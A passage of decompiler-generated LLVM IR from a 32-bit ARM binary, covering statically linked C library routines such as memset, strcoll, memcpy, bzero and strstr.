  %v2_150bc = icmp eq i32 %v4_150b8, 0
  br i1 %v2_150bc, label %dec_label_pc_150c4thread-pre-split, label %dec_label_pc_15124

dec_label_pc_150c4thread-pre-split:               ; preds = %dec_label_pc_150b0
  %v0_150c4.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_150c4

dec_label_pc_150c4:                               ; preds = %dec_label_pc_150c4thread-pre-split, %entry
  %v0_150e8 = phi i32 [ %v0_150c4.pr, %dec_label_pc_150c4thread-pre-split ], [ %arg2, %entry ]
  %v2_150c4 = icmp eq i32 %v0_150e8, 0
  br i1 %v2_150c4, label %dec_label_pc_15124, label %bb

bb:                                               ; preds = %dec_label_pc_150c4
  %v1_150c8 = load i32, i32* @r6, align 4
  %v3_150c8 = icmp eq i32 %v1_150c8, 0
  br i1 %v3_150c8, label %dec_label_pc_15124, label %dec_label_pc_150d0

dec_label_pc_150d0:                               ; preds = %bb
  %v2_150d8 = udiv i32 -1, %v0_150e8
  %tmp9 = icmp ugt i32 %v1_150c8, %v2_150d8
  %v0_15104 = load i32, i32* @r5, align 4
  %v1_15104 = inttoptr i32 %v0_15104 to i16*
  br i1 %tmp9, label %dec_label_pc_15104, label %dec_label_pc_150e4

dec_label_pc_150e4:                               ; preds = %dec_label_pc_150d0
  store i32 %v0_15104, i32* %r2.global-to-local, align 4
  %v2_150e8 = mul i32 %v1_150c8, %v0_150e8
  %v0_150ec = load i32, i32* @r7, align 4
  %v5_150f0 = call i32 @__stdio_fwrite(i32 %v0_150ec, i32 %v2_150e8, i16* %v1_15104)
  %v0_150f4 = load i32, i32* @r4, align 4
  %v2_150f8 = udiv i32 %v5_150f0, %v0_150f4
  store i32 %v2_150f8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15128

dec_label_pc_15104:                               ; preds = %dec_label_pc_150d0
  %v2_15104 = load i16, i16* %v1_15104, align 2
  %v1_15108 = or i16 %v2_15104, 8
  store i16 %v1_15108, i16* %v1_15104, align 2
  %v0_15110 = call i32 @__GI___errno_location()
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_1511c = inttoptr i32 %v0_15110 to i32*
  store i32 22, i32* %v2_1511c, align 4
  %v0_15128.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15128

dec_label_pc_15124:                               ; preds = %dec_label_pc_150c4, %dec_label_pc_150b0, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15128

dec_label_pc_15128:                               ; preds = %dec_label_pc_15104, %dec_label_pc_150e4, %dec_label_pc_15124
  %v0_15128 = phi i32 [ %v0_15128.pre, %dec_label_pc_15104 ], [ %v2_150f8, %dec_label_pc_150e4 ], [ 0, %dec_label_pc_15124 ]
  store i32 %v9_15088, i32* @r6, align 4
  store i32 %v12_15088, i32* @r7, align 4
  ret i32 %v0_15128

; uselistorder directives
  uselistorder i16* %v1_15104, { 0, 2, 1 }
  uselistorder i32 %v1_150c8, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_15128, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15124, { 2, 0, 1 }
}

define i32 @function_15138(i32 %arg1) local_unnamed_addr {
dec_label_pc_15138:
  ret i32 %arg1
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_15144 = load i32, i32* @r2, align 4
  %v8_15144 = icmp eq i32 %v0_15144, 8
  store i1 %v8_15144, i1* %cpsr_z.global-to-local, align 1
  %v5_15148 = icmp slt i32 %v0_15144, 8
  br i1 %v5_15148, label %dec_label_pc_151a8, label %dec_label_pc_1514c

dec_label_pc_1514c:                               ; preds = %entry
  %v4_1514c = mul i32 %arg2, 256
  %v5_1514c = or i32 %v4_1514c, %arg2
  %v4_15150 = mul i32 %v5_1514c, 65536
  %v5_15150 = or i32 %v4_15150, %v5_1514c
  store i32 %v5_15150, i32* %r1.global-to-local, align 4
  %v1_1515457 = urem i32 %tmp, 4
  %v2_1515458 = icmp eq i32 %v1_1515457, 0
  store i1 %v2_1515458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_1515458, label %dec_label_pc_15164, label %bb

bb:                                               ; preds = %dec_label_pc_1514c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_1514c ]
  %v3_1515859 = phi i32 [ %v6_15158, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_1514c ]
  %v4_15158 = inttoptr i32 %v3_1515859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_15158, align 1
  %v5_15158 = load i32, i32* @r3, align 4
  %v6_15158 = add i32 %v5_15158, 1
  store i32 %v6_15158, i32* @r3, align 4
  %v0_1515c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_15168.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_1515c.pr, label %dec_label_pc_15164, label %.thread

.thread:                                          ; preds = %bb
  %v2_1515c = add i32 %v0_15168.pr.pre, -1
  store i32 %v2_1515c, i32* @r2, align 4
  %v1_15154 = urem i32 %v6_15158, 4
  %v2_15154 = icmp eq i32 %v1_15154, 0
  store i1 %v2_15154, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15154, label %dec_label_pc_15164, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_15158.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_15158.pre to i8
  br label %bb

dec_label_pc_15164:                               ; preds = %.thread, %bb, %dec_label_pc_1514c
  %v0_1517028 = phi i32 [ %tmp, %dec_label_pc_1514c ], [ %v6_15158, %bb ], [ %v6_15158, %.thread ]
  %v0_15168.pr = phi i32 [ %v0_15144, %dec_label_pc_1514c ], [ %v0_15168.pr.pre, %bb ], [ %v2_1515c, %.thread ]
  %v0_15164 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_15164, i32* @ip, align 4
  %v8_1516810 = icmp eq i32 %v0_15168.pr, 8
  store i1 %v8_1516810, i1* %cpsr_z.global-to-local, align 1
  %v5_1516c11 = icmp slt i32 %v0_15168.pr, 8
  br i1 %v5_1516c11, label %dec_label_pc_151a8, label %dec_label_pc_15170.preheader

dec_label_pc_15170.preheader:                     ; preds = %dec_label_pc_15164
  %v1_1517046 = inttoptr i32 %v0_1517028 to i32*
  store i32 %v0_15164, i32* %v1_1517046, align 4
  %v3_1517047 = add i32 %v0_1517028, 4
  %v4_1517048 = inttoptr i32 %v3_1517047 to i32*
  %v5_1517049 = load i32, i32* @ip, align 4
  store i32 %v5_1517049, i32* %v4_1517048, align 4
  %v6_1517050 = add i32 %v0_1517028, 8
  store i32 %v6_1517050, i32* @r3, align 4
  %v0_1517451 = load i32, i32* @r2, align 4
  %v1_1517452 = add i32 %v0_1517451, -8
  store i32 %v1_1517452, i32* %r2.global-to-local, align 4
  %v5_1517c53 = icmp slt i32 %v1_1517452, 8
  br i1 %v5_1517c53, label %dec_label_pc_15170.dec_label_pc_151a8.loopexit_crit_edge, label %dec_label_pc_15180

dec_label_pc_15180:                               ; preds = %dec_label_pc_15170.preheader, %dec_label_pc_15168.dec_label_pc_15170_crit_edge
  %v6_1517055 = phi i32 [ %v6_15170, %dec_label_pc_15168.dec_label_pc_15170_crit_edge ], [ %v6_1517050, %dec_label_pc_15170.preheader ]
  %v0_1517054 = phi i32 [ %v12_1519c, %dec_label_pc_15168.dec_label_pc_15170_crit_edge ], [ %v0_1517028, %dec_label_pc_15170.preheader ]
  %v1_15180 = inttoptr i32 %v6_1517055 to i32*
  %v2_15180 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_15180, i32* %v1_15180, align 4
  %v3_15180 = add i32 %v0_1517054, 12
  %v4_15180 = inttoptr i32 %v3_15180 to i32*
  %v5_15180 = load i32, i32* @ip, align 4
  store i32 %v5_15180, i32* %v4_15180, align 4
  %v6_15180 = add i32 %v0_1517054, 16
  store i32 %v6_15180, i32* @r3, align 4
  %v0_15184 = load i32, i32* %r2.global-to-local, align 4
  %v1_15184 = add i32 %v0_15184, -8
  store i32 %v1_15184, i32* %r2.global-to-local, align 4
  %v5_1518c = icmp slt i32 %v1_15184, 8
  br i1 %v5_1518c, label %dec_label_pc_15180.dec_label_pc_151a8.loopexit_crit_edge, label %dec_label_pc_15190

dec_label_pc_15190:                               ; preds = %dec_label_pc_15180
  %v1_15190 = inttoptr i32 %v6_15180 to i32*
  %v2_15190 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_15190, i32* %v1_15190, align 4
  %v3_15190 = add i32 %v0_1517054, 20
  %v4_15190 = inttoptr i32 %v3_15190 to i32*
  %v5_15190 = load i32, i32* @ip, align 4
  store i32 %v5_15190, i32* %v4_15190, align 4
  %v6_15190 = add i32 %v0_1517054, 24
  store i32 %v6_15190, i32* @r3, align 4
  %v0_15194 = load i32, i32* %r2.global-to-local, align 4
  %v1_15194 = add i32 %v0_15194, -8
  store i32 %v1_15194, i32* %r2.global-to-local, align 4
  %v5_1519c = icmp slt i32 %v1_15194, 8
  br i1 %v5_1519c, label %dec_label_pc_15190.dec_label_pc_151a8.loopexit_crit_edge, label %dec_label_pc_15168

dec_label_pc_15168:                               ; preds = %dec_label_pc_15190
  %v7_1519c = inttoptr i32 %v6_15190 to i32*
  %v8_1519c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_1519c, i32* %v7_1519c, align 4
  %v9_1519c = add i32 %v0_1517054, 28
  %v10_1519c = inttoptr i32 %v9_1519c to i32*
  %v11_1519c = load i32, i32* @ip, align 4
  store i32 %v11_1519c, i32* %v10_1519c, align 4
  %v12_1519c = add i32 %v0_1517054, 32
  store i32 %v12_1519c, i32* @r3, align 4
  %v6_151a0 = load i32, i32* %r2.global-to-local, align 4
  %v7_151a0 = add i32 %v6_151a0, -8
  store i32 %v7_151a0, i32* %r2.global-to-local, align 4
  %v5_1516c = icmp slt i32 %v7_151a0, 8
  br i1 %v5_1516c, label %dec_label_pc_15168.dec_label_pc_151a8.loopexit_crit_edge, label %dec_label_pc_15168.dec_label_pc_15170_crit_edge

dec_label_pc_15168.dec_label_pc_15170_crit_edge:  ; preds = %dec_label_pc_15168
  %v2_15170.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_15170 = inttoptr i32 %v12_1519c to i32*
  store i32 %v2_15170.pre, i32* %v1_15170, align 4
  %v3_15170 = add i32 %v0_1517054, 36
  %v4_15170 = inttoptr i32 %v3_15170 to i32*
  %v5_15170 = load i32, i32* @ip, align 4
  store i32 %v5_15170, i32* %v4_15170, align 4
  %v6_15170 = add i32 %v0_1517054, 40
  store i32 %v6_15170, i32* @r3, align 4
  %v0_15174 = load i32, i32* %r2.global-to-local, align 4
  %v1_15174 = add i32 %v0_15174, -8
  store i32 %v1_15174, i32* %r2.global-to-local, align 4
  %v5_1517c = icmp slt i32 %v1_15174, 8
  br i1 %v5_1517c, label %dec_label_pc_15170.dec_label_pc_151a8.loopexit_crit_edge, label %dec_label_pc_15180

dec_label_pc_15168.dec_label_pc_151a8.loopexit_crit_edge: ; preds = %dec_label_pc_15168
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_151a8

dec_label_pc_15170.dec_label_pc_151a8.loopexit_crit_edge: ; preds = %dec_label_pc_15168.dec_label_pc_15170_crit_edge, %dec_label_pc_15170.preheader
  %v1_15174.lcssa = phi i32 [ %v1_1517452, %dec_label_pc_15170.preheader ], [ %v1_15174, %dec_label_pc_15168.dec_label_pc_15170_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_151a8

dec_label_pc_15180.dec_label_pc_151a8.loopexit_crit_edge: ; preds = %dec_label_pc_15180
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_151a8

dec_label_pc_15190.dec_label_pc_151a8.loopexit_crit_edge: ; preds = %dec_label_pc_15190
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_151a8

dec_label_pc_151a8:                               ; preds = %dec_label_pc_15164, %dec_label_pc_15168.dec_label_pc_151a8.loopexit_crit_edge, %dec_label_pc_15170.dec_label_pc_151a8.loopexit_crit_edge, %dec_label_pc_15180.dec_label_pc_151a8.loopexit_crit_edge, %dec_label_pc_15190.dec_label_pc_151a8.loopexit_crit_edge, %entry
  %v0_151b0 = phi i32 [ %v0_15144, %entry ], [ %v1_15194, %dec_label_pc_15190.dec_label_pc_151a8.loopexit_crit_edge ], [ %v1_15184, %dec_label_pc_15180.dec_label_pc_151a8.loopexit_crit_edge ], [ %v1_15174.lcssa, %dec_label_pc_15170.dec_label_pc_151a8.loopexit_crit_edge ], [ %v7_151a0, %dec_label_pc_15168.dec_label_pc_151a8.loopexit_crit_edge ], [ %v0_15168.pr, %dec_label_pc_15164 ]
  %v2_151a8 = icmp eq i32 %v0_151b0, 0
  store i1 %v2_151a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_151a8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_151a8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_151a8
  %v1_151b0 = sub i32 7, %v0_151b0
  store i32 %v1_151b0, i32* %r2.global-to-local, align 4
  %v3_151b4 = mul i32 %v1_151b0, 4
  %v4_151b4 = add i32 %v3_151b4, ptrtoint (i32* @global_var_151bc.940 to i32)
  call void @__pseudo_branch(i32 %v4_151b4)
  %v0_151bc = load i32, i32* %r1.global-to-local, align 4
  %v1_151bc = trunc i32 %v0_151bc to i8
  %v2_151bc = load i32, i32* @r3, align 4
  %v3_151bc = inttoptr i32 %v2_151bc to i8*
  store i8 %v1_151bc, i8* %v3_151bc, align 1
  %v4_151bc = load i32, i32* @r3, align 4
  %v5_151bc = add i32 %v4_151bc, 1
  store i32 %v5_151bc, i32* %r3.global-to-local, align 4
  %v0_151c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_151c0 = trunc i32 %v0_151c0 to i8
  %v3_151c0 = inttoptr i32 %v5_151bc to i8*
  store i8 %v1_151c0, i8* %v3_151c0, align 1
  %v4_151c0 = load i32, i32* %r3.global-to-local, align 4
  %v5_151c0 = add i32 %v4_151c0, 1
  store i32 %v5_151c0, i32* %r3.global-to-local, align 4
  %v0_151c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_151c4 = trunc i32 %v0_151c4 to i8
  %v3_151c4 = inttoptr i32 %v5_151c0 to i8*
  store i8 %v1_151c4, i8* %v3_151c4, align 1
  %v4_151c4 = load i32, i32* %r3.global-to-local, align 4
  %v5_151c4 = add i32 %v4_151c4, 1
  store i32 %v5_151c4, i32* %r3.global-to-local, align 4
  %v0_151c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_151c8 = trunc i32 %v0_151c8 to i8
  %v3_151c8 = inttoptr i32 %v5_151c4 to i8*
  store i8 %v1_151c8, i8* %v3_151c8, align 1
  %v4_151c8 = load i32, i32* %r3.global-to-local, align 4
  %v5_151c8 = add i32 %v4_151c8, 1
  store i32 %v5_151c8, i32* %r3.global-to-local, align 4
  %v0_151cc = load i32, i32* %r1.global-to-local, align 4
  %v1_151cc = trunc i32 %v0_151cc to i8
  %v3_151cc = inttoptr i32 %v5_151c8 to i8*
  store i8 %v1_151cc, i8* %v3_151cc, align 1
  %v4_151cc = load i32, i32* %r3.global-to-local, align 4
  %v5_151cc = add i32 %v4_151cc, 1
  store i32 %v5_151cc, i32* %r3.global-to-local, align 4
  %v0_151d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_151d0 = trunc i32 %v0_151d0 to i8
  %v3_151d0 = inttoptr i32 %v5_151cc to i8*
  store i8 %v1_151d0, i8* %v3_151d0, align 1
  %v4_151d0 = load i32, i32* %r3.global-to-local, align 4
  %v5_151d0 = add i32 %v4_151d0, 1
  store i32 %v5_151d0, i32* %r3.global-to-local, align 4
  %v0_151d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_151d4 = trunc i32 %v0_151d4 to i8
  %v3_151d4 = inttoptr i32 %v5_151d0 to i8*
  store i8 %v1_151d4, i8* %v3_151d4, align 1
  %v4_151d4 = load i32, i32* %r3.global-to-local, align 4
  %v5_151d4 = add i32 %v4_151d4, 1
  store i32 %v5_151d4, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_15170, { 1, 0 }
  uselistorder i32 %v12_1519c, { 1, 2, 0 }
  uselistorder i32 %v0_1517054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_15168.pr, { 0, 2, 1 }
  uselistorder i32 %v6_15158, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_1514c, { 1, 0 }
  uselistorder i32 %v0_15144, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 9, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 3, 2, 1, 4, 0, 8, 7, 5, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_151a8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_15180, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v2_1524c = inttoptr i32 %arg2 to i8*
  %v3_1524c = call i32 @_memcpy(i8* %v2_1524c, i32 %arg1)
  ret i32 %v3_1524c
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_15254.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_15254 = phi i32 [ %v0_15254.pre, %bb ], [ %v5_15254, %bb3 ]
  %v0_15250 = phi i32 [ %tmp, %bb ], [ %v5_15250, %bb3 ]
  %v1_15250 = inttoptr i32 %v0_15250 to i8*
  %v2_15250 = load i8, i8* %v1_15250, align 1
  %v3_15250 = zext i8 %v2_15250 to i32
  store i32 %v3_15250, i32* @r2, align 4
  %v1_15254 = inttoptr i32 %v0_15254 to i8*
  %v2_15254 = load i8, i8* %v1_15254, align 1
  %v3_15254 = zext i8 %v2_15254 to i32
  %v2_15258 = icmp eq i8 %v2_15250, 0
  br i1 %v2_15258, label %.dec_label_pc_15264_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_15254 = add i32 %v0_15254, 1
  %v5_15250 = add i32 %v0_15250, 1
  %v10_1525c = icmp eq i8 %v2_15250, %v2_15254
  br i1 %v10_1525c, label %entry, label %dec_label_pc_15264

.dec_label_pc_15264_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_15264

dec_label_pc_15264:                               ; preds = %bb3, %.dec_label_pc_15264_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_15264_crit_edge ], [ %v3_15250, %bb3 ]
  %v2_15264.pre-phi = sub nsw i32 %.pn, %v3_15254
  ret i32 %v2_15264.pre-phi

; uselistorder directives
  uselistorder i32 %v0_15250, { 1, 0 }
  uselistorder i32 %v0_15254, { 1, 0 }
  uselistorder label %dec_label_pc_15264, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_15270 = load i32, i32* @r0, align 4
  %v1_15270 = load i32, i32* @r1, align 4
  %v2_15270 = inttoptr i32 %v0_15270 to i8*
  %v3_15270 = call i32 @_memcpy(i8* %v2_15270, i32 %v1_15270)
  ret i32 %v3_15270
}

define i32 @bzero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  %v0_15288 = load i32, i32* @r0, align 4
  %v2_15288 = inttoptr i32 %v0_15288 to i8*
  %v3_15288 = call i32 @__GI_memset(i8* %v2_15288, i32 0)
  ret i32 %v3_15288
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_15294 = load i8, i8* %arg2, align 1
  %v2_15298 = icmp eq i8 %v3_15294, 0
  %v1_15388.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v2_15298, label %dec_label_pc_15384, label %dec_label_pc_152a0

dec_label_pc_152a0:                               ; preds = %entry
  %v1_152a0 = add i32 %v1_15388.pre, -1
  store i32 %v1_152a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_152a4

dec_label_pc_152a4:                               ; preds = %dec_label_pc_152b0, %dec_label_pc_152a0
  %v0_152a4 = phi i32 [ %v1_152a4, %dec_label_pc_152b0 ], [ %v1_152a0, %dec_label_pc_152a0 ]
  %v1_152a4 = add i32 %v0_152a4, 1
  %v2_152a4 = inttoptr i32 %v1_152a4 to i8*
  %v3_152a4 = load i8, i8* %v2_152a4, align 1
  store i32 %v1_152a4, i32* %r0.global-to-local, align 4
  %v2_152a8 = icmp eq i8 %v3_152a4, 0
  br i1 %v2_152a8, label %dec_label_pc_15380, label %dec_label_pc_152b0

dec_label_pc_152b0:                               ; preds = %dec_label_pc_152a4
  %v9_152b0 = icmp eq i8 %v3_152a4, %v3_15294
  br i1 %v9_152b0, label %dec_label_pc_152b8, label %dec_label_pc_152a4

dec_label_pc_152b8:                               ; preds = %dec_label_pc_152b0
  %v2_152b8 = add i32 %tmp, 1
  %v3_152b8 = inttoptr i32 %v2_152b8 to i8*
  %v4_152b8 = load i8, i8* %v3_152b8, align 1
  %v2_152bc = icmp eq i8 %v4_152b8, 0
  br i1 %v2_152bc, label %dec_label_pc_15384, label %dec_label_pc_152c8

dec_label_pc_152c8:                               ; preds = %dec_label_pc_152b8
  %v1_152c8 = add i32 %v0_152a4, 2
  %v1_1531c = add i32 %tmp, 2
  %v2_1531c = inttoptr i32 %v1_1531c to i8*
  br label %dec_label_pc_15314

dec_label_pc_152d8:                               ; preds = %dec_label_pc_15374
  %v3_152d8 = load i8, i8* %v3_1530c.pn.in, align 1
  store i32 %storemerge41, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15304.preheader

dec_label_pc_15304.preheader:                     ; preds = %dec_label_pc_152d8, %dec_label_pc_15314
  %v0_153043.in = phi i8 [ %v3_152d8, %dec_label_pc_152d8 ], [ %v3_1530c.pn, %dec_label_pc_15314 ]
  %v9_1530412 = icmp eq i8 %v0_153043.in, %v3_15294
  br i1 %v9_1530412, label %dec_label_pc_1530c, label %dec_label_pc_152e4

dec_label_pc_152e4:                               ; preds = %dec_label_pc_15304.preheader, %dec_label_pc_15300
  %v0_152ec = phi i32 [ %v1_15300, %dec_label_pc_15300 ], [ %storemerge41, %dec_label_pc_15304.preheader ]
  %v0_152e4.in = phi i8 [ %v3_15300, %dec_label_pc_15300 ], [ %v0_153043.in, %dec_label_pc_15304.preheader ]
  %v2_152e4 = icmp eq i8 %v0_152e4.in, 0
  br i1 %v2_152e4, label %dec_label_pc_15380, label %dec_label_pc_152ec

dec_label_pc_152ec:                               ; preds = %dec_label_pc_152e4
  %v1_152ec = add i32 %v0_152ec, 1
  %v2_152ec = inttoptr i32 %v1_152ec to i8*
  %v3_152ec = load i8, i8* %v2_152ec, align 1
  store i32 %v1_152ec, i32* %r0.global-to-local, align 4
  %v9_152f0 = icmp eq i8 %v3_152ec, %v3_15294
  br i1 %v9_152f0, label %dec_label_pc_1530c, label %dec_label_pc_152f8

dec_label_pc_152f8:                               ; preds = %dec_label_pc_152ec
  %v2_152f8 = icmp eq i8 %v3_152ec, 0
  br i1 %v2_152f8, label %dec_label_pc_15380, label %dec_label_pc_15300

dec_label_pc_15300:                               ; preds = %dec_label_pc_152f8
  %v1_15300 = add i32 %v0_152ec, 2
  %v2_15300 = inttoptr i32 %v1_15300 to i8*
  %v3_15300 = load i8, i8* %v2_15300, align 1
  store i32 %v1_15300, i32* %r0.global-to-local, align 4
  %v9_15304 = icmp eq i8 %v3_15300, %v3_15294
  br i1 %v9_15304, label %dec_label_pc_1530c, label %dec_label_pc_152e4

dec_label_pc_1530c:                               ; preds = %dec_label_pc_152ec, %dec_label_pc_15300, %dec_label_pc_15304.preheader
  %v0_1530c = phi i32 [ %storemerge41, %dec_label_pc_15304.preheader ], [ %v1_152ec, %dec_label_pc_152ec ], [ %v1_15300, %dec_label_pc_15300 ]
  %v1_1530c = add i32 %v0_1530c, 1
  br label %dec_label_pc_15314

dec_label_pc_15314:                               ; preds = %dec_label_pc_152c8, %dec_label_pc_1530c
  %storemerge41 = phi i32 [ %v1_1530c, %dec_label_pc_1530c ], [ %v1_152c8, %dec_label_pc_152c8 ]
  %v3_1530c.pn.in = inttoptr i32 %storemerge41 to i8*
  %v3_1530c.pn = load i8, i8* %v3_1530c.pn.in, align 1
  store i32 %storemerge41, i32* %r0.global-to-local, align 4
  %storemerge = icmp eq i8 %v3_1530c.pn, %v4_152b8
  br i1 %storemerge, label %dec_label_pc_15318, label %dec_label_pc_15304.preheader

dec_label_pc_15318:                               ; preds = %dec_label_pc_15314
  %v1_15318 = add i32 %storemerge41, 1
  %v2_15318 = inttoptr i32 %v1_15318 to i8*
  %v3_15318 = load i8, i8* %v2_15318, align 1
  %v4_15318 = zext i8 %v3_15318 to i32
  %v3_1531c = load i8, i8* %v2_1531c, align 1
  %v4_1531c = zext i8 %v3_1531c to i32
  %v9_15324 = icmp eq i8 %v3_15318, %v3_1531c
  %v1_1532c = add i32 %storemerge41, -1
  store i32 %v1_1532c, i32* %r0.global-to-local, align 4
  br i1 %v9_15324, label %dec_label_pc_15334, label %dec_label_pc_15374

dec_label_pc_15334:                               ; preds = %dec_label_pc_15318, %dec_label_pc_15364
  %v0_1534c = phi i32 [ %v1_15354, %dec_label_pc_15364 ], [ %v1_1531c, %dec_label_pc_15318 ]
  %v0_15344 = phi i32 [ %v1_15350, %dec_label_pc_15364 ], [ %v1_15318, %dec_label_pc_15318 ]
  %v0_15334 = phi i32 [ %v4_15364, %dec_label_pc_15364 ], [ %v4_15318, %dec_label_pc_15318 ]
  %v2_15334 = icmp eq i32 %v0_15334, 0
  br i1 %v2_15334, label %dec_label_pc_15384, label %dec_label_pc_1533c

dec_label_pc_1533c:                               ; preds = %dec_label_pc_15334
  %v1_1533c = add i32 %v0_15344, 1
  %v2_1533c = inttoptr i32 %v1_1533c to i8*
  %v3_1533c = load i8, i8* %v2_1533c, align 1
  %v1_15340 = add i32 %v0_1534c, 1
  %v2_15340 = inttoptr i32 %v1_15340 to i8*
  %v3_15340 = load i8, i8* %v2_15340, align 1
  %v4_15340 = zext i8 %v3_15340 to i32
  store i32 %v1_1533c, i32* @r1, align 4
  %v9_15348 = icmp eq i8 %v3_1533c, %v3_15340
  %v1_15350 = add i32 %v0_15344, 2
  %v1_15354 = add i32 %v0_1534c, 2
  br i1 %v9_15348, label %dec_label_pc_1535c, label %dec_label_pc_15374

dec_label_pc_1535c:                               ; preds = %dec_label_pc_1533c
  %v2_1535c = icmp eq i8 %v3_1533c, 0
  br i1 %v2_1535c, label %dec_label_pc_15384, label %dec_label_pc_15364

dec_label_pc_15364:                               ; preds = %dec_label_pc_1535c
  %v2_15364 = inttoptr i32 %v1_15354 to i8*
  %v3_15364 = load i8, i8* %v2_15364, align 1
  %v4_15364 = zext i8 %v3_15364 to i32
  %v2_15368 = inttoptr i32 %v1_15350 to i8*
  %v3_15368 = load i8, i8* %v2_15368, align 1
  %v9_1536c = icmp eq i8 %v3_15368, %v3_15364
  br i1 %v9_1536c, label %dec_label_pc_15334, label %dec_label_pc_15374

dec_label_pc_15374:                               ; preds = %dec_label_pc_15364, %dec_label_pc_1533c, %dec_label_pc_15318
  %v0_15374 = phi i32 [ %v4_1531c, %dec_label_pc_15318 ], [ %v4_15364, %dec_label_pc_15364 ], [ %v4_15340, %dec_label_pc_1533c ]
  %v2_15374 = icmp eq i32 %v0_15374, 0
  br i1 %v2_15374, label %dec_label_pc_15384, label %dec_label_pc_152d8

dec_label_pc_15380:                               ; preds = %dec_label_pc_152a4, %dec_label_pc_152f8, %dec_label_pc_152e4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15384

dec_label_pc_15384:                               ; preds = %dec_label_pc_15374, %dec_label_pc_1535c, %dec_label_pc_15334, %entry, %dec_label_pc_152b8, %dec_label_pc_15380
  %v1_15388 = phi i32 [ %v1_152a4, %dec_label_pc_152b8 ], [ 0, %dec_label_pc_15380 ], [ %v1_15388.pre, %entry ], [ %v1_1532c, %dec_label_pc_15334 ], [ %v1_1532c, %dec_label_pc_1535c ], [ %v1_1532c, %dec_label_pc_15374 ]
  ret i32 %v1_15388

; uselistorder directives
  uselistorder i32 %v1_15350, { 1, 0 }
  uselistorder i8 %v3_1530c.pn, { 1, 0 }
  uselistorder i8* %v3_1530c.pn.in, { 1, 0 }
  uselistorder i32 %storemerge41, { 3, 2, 6, 1, 4, 0, 5 }
